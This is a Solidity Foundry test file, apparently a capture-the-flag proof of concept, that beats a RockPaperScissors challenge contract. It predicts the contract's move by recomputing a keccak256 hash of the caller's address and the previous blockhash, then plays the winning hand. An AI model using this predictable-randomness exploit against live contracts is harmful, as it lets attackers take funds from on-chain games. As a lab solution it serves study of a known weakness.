// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {RockPaperScissors,Challenge} from "src/RockPaperScissors.sol";

contract RockPaperScissors_POC is Test {
    RockPaperScissors _rockPaperScissors;
    Challenge _challenge;
    function init() private{
        vm.startPrank(address(0x10));
        _challenge = new Challenge(address(this));
        _rockPaperScissors = _challenge.rps();
        vm.stopPrank();
    }
    function setUp() public {
        init();
    }
    function test_RockPaperScissors_POC() public{
        uint256 target = uint256(keccak256(abi.encodePacked(address(this), blockhash(block.number - 1)))) % 3;
        if(target==0){
            _rockPaperScissors.tryToBeatMe(RockPaperScissors.Hand.Paper);
        }else if(target==1){
            _rockPaperScissors.tryToBeatMe(RockPaperScissors.Hand.Scissors);
        }else if(target==2){
            _rockPaperScissors.tryToBeatMe(RockPaperScissors.Hand.Rock);
        }
        console.log("Solved: ", _challenge.isSolved());
    }
}
